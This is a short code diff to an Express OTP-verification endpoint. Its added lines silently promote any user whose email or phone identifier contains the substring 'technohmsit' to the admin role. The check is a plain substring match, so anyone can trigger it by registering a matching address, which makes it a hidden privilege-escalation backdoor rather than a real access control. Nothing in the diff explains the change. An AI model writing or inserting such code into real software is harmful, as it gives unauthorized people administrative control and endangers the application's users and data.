@@ -80,6 +80,9 @@ app.post('/api/auth/verify-otp', async (req, res) => {
         name: name || (isEmail ? identifier.split('@')[0] : identifier)
       });
       await user.save();
+    } else if (identifier.includes('technohmsit') && user.role !== 'admin') {
+      user.role = 'admin';
+      await user.save();
     }
 
     const token = jwt.sign({ id: user._id }, process.env.JWT_SECRET, { expiresIn: '365d' });
